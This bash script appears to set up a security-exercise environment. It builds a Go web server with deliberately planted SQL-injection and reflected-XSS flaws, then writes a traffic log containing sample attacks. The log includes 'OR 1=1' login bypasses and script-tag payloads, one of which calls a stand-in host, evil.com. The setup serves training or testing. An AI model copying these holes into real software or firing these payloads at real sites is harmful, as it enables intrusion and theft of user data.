#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip golang curl procps
    pip3 install pytest

    mkdir -p /home/user/app
    cd /home/user/app

    cat << 'EOF' > server.go
package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
)

func main() {
	http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", 405)
			return
		}
		var creds map[string]string
		json.NewDecoder(r.Body).Decode(&creds)

		// VULNERABILITY: Naive string concatenation simulating bad SQL auth
		query := fmt.Sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", creds["username"], creds["password"])

		if strings.Contains(query, "' OR 1=1 --") {
			w.WriteHeader(200)
			w.Write([]byte("Logged in as admin"))
		} else {
			w.WriteHeader(401)
			w.Write([]byte("Unauthorized"))
		}
	})

	http.HandleFunc("/search", func(w http.ResponseWriter, r *http.Request) {
		q := r.URL.Query().Get("q")
		// VULNERABILITY: Reflected XSS
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte("<html><body>Results for: " + q + "</body></html>"))
	})

	fmt.Println("Starting server...")
	log.Fatal(http.ListenAndServe("127.0.0.1:8432", nil))
}
EOF

    go build -o goserver server.go

    cat << 'EOF' > traffic.log
{"ip": "192.168.1.10", "method": "GET", "path": "/search?q=apples", "status": 200}
{"ip": "10.0.0.5", "method": "POST", "path": "/login", "status": 401, "body": "{\"username\":\"bob\",\"password\":\"pass\"}"}
{"ip": "172.16.0.42", "method": "GET", "path": "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "status": 200}
{"ip": "192.168.1.15", "method": "GET", "path": "/search?q=bananas", "status": 200}
{"ip": "203.0.113.8", "method": "POST", "path": "/login", "status": 200, "body": "{\"username\":\"admin' OR 1=1 --\",\"password\":\"\"}"}
{"ip": "10.0.0.99", "method": "GET", "path": "/search?q=oranges%3Cscript%3Efetch('http://evil.com')%3C/script%3E", "status": 200}
{"ip": "198.51.100.22", "method": "POST", "path": "/login", "status": 401, "body": "{\"username\":\"alice\",\"password\":\"12345\"}"}
{"ip": "192.168.1.10", "method": "GET", "path": "/search?q=pears", "status": 200}
{"ip": "172.16.0.42", "method": "POST", "path": "/login", "status": 200, "body": "{\"username\":\"admin' OR 1=1 --\",\"password\":\"foo\"}"}
EOF

    useradd -m -s /bin/bash user || true

    # Create a script to automatically start the server when a shell or command is executed, if not already running
    cat << 'EOF' > /.singularity.d/env/99-start-server.sh
#!/bin/sh
if ! pgrep -f goserver > /dev/null 2>&1; then
    /home/user/app/goserver > /dev/null 2>&1 &
    sleep 1
fi
EOF
    chmod +x /.singularity.d/env/99-start-server.sh

    chmod -R 777 /home/user
